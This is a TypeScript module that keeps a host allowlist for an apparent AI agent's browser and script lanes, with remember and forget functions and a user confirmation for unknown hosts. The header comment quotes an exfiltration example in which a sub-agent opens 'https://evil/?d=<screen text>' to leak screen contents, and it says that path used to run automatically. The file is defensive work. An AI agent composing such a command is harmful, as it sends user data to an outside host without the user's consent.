import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { config } from '../config.ts';

/**
 * M7 host allowlist — one list for both computer-use surfaces, mirroring the M4.1 egress
 * proxy's posture (known hosts flow freely, unknown ones escalate to a notch confirm,
 * never a silent block):
 *   1. the browser lane: browser_navigate targets + the page a browser_act runs on;
 *   2. the script lanes: gateScript's literal-URL gate, which CLOSES the exfil residual
 *      recorded in policy.ts (a sub-agent composing `open location "https://evil/?d=
 *      <screen text>"` used to auto-run — now the unknown host confirms).
 * Base entries come from config.browser.allowedHosts; per-confirm "remember" approvals
 * persist in ~/Gumbo/browser/hosts.json (secret-adjacent state, never /files-served).
 */

// In-memory cache of the remembered file. Tests run one file per process (node --test
// isolation), so module state is safe — same memoization idiom as audit.ts.
let remembered: Set<string> | null = null;

function hostsFile(): string {
  return join(config.home.browser, 'hosts.json');
}

function load(): Set<string> {
  if (remembered) return remembered;
  try {
    const raw: unknown = JSON.parse(readFileSync(hostsFile(), 'utf8'));
    remembered = new Set(Array.isArray(raw) ? raw.filter((h): h is string => typeof h === 'string').map(normalizeHost) : []);
  } catch {
    remembered = new Set(); // missing or corrupt file → empty; the confirm flow is the fail-safe
  }
  return remembered;
}

function normalizeHost(host: string): string {
  return host.toLowerCase().replace(/\.$/, '');
}

/** A well-formed allowlist ENTRY (not a URL): a bare hostname with at least one dot.
 *  The dot requirement rejects a single-label entry like "com" — `hostAllowed`'s
 *  subdomain match (`host.endsWith('.'+entry)`) would otherwise allowlist an entire TLD
 *  from one row (review 🔴/🔵). Used by the untrusted /api/hosts surface; the notch
 *  "remember" path feeds a real `hostOf(url)`, so it's already well-formed.
 *  RESIDUAL (second-review 🔵): a two-label public suffix (`co.uk`, `com.au`) still passes
 *  and would allowlist that whole eTLD via the subdomain match. Accepted for v1 — entries
 *  come only from the user (dashboard, Origin-gated to loopback) or a real navigated URL, so
 *  a bare eTLD is never actually written; a public-suffix-list check is overkill for a
 *  single-user tool and would add a dependency against the minimalism rule. */
export function validHostEntry(host: string): boolean {
  return host.length > 0 && !/[\s/:]/.test(host) && host.includes('.');
}

/** Hostname of a URL, or null when it can't be parsed (callers treat null as "not a web
 *  URL" — e.g. about:blank — never as approved-by-accident for a real fetch target). */
export function hostOf(url: string): string | null {
  try {
    const host = new URL(url).hostname;
    return host ? normalizeHost(host) : null;
  } catch {
    return null;
  }
}

/** True when the URL's host is the user-approved: an exact entry or a subdomain of one
 *  (bare domains match subdomains, like sandbox.allowedDomains). */
export function hostAllowed(url: string): boolean {
  const host = hostOf(url);
  if (!host) return false;
  const entries = [...config.browser.allowedHosts.map(normalizeHost), ...load()];
  return entries.some((entry) => host === entry || host.endsWith('.' + entry));
}

/** Persist a host the user approved with "remember" — write-through so the next task (and
 *  the script lanes) skip the confirm. */
export function rememberHost(host: string) {
  const set = load();
  set.add(normalizeHost(host));
  persist(set);
}

/** Drop a remembered host (dashboard management). Config-base entries are code-owned and
 *  not removable here. */
export function forgetHost(host: string) {
  const set = load();
  set.delete(normalizeHost(host));
  persist(set);
}

/** For /api/hosts + the dashboard section: what flows freely and why. */
export function listHosts(): { base: string[]; remembered: string[] } {
  return { base: config.browser.allowedHosts.map(normalizeHost), remembered: [...load()].sort() };
}

function persist(set: Set<string>) {
  mkdirSync(config.home.browser, { recursive: true });
  writeFileSync(hostsFile(), JSON.stringify([...set].sort(), null, 2) + '\n');
}
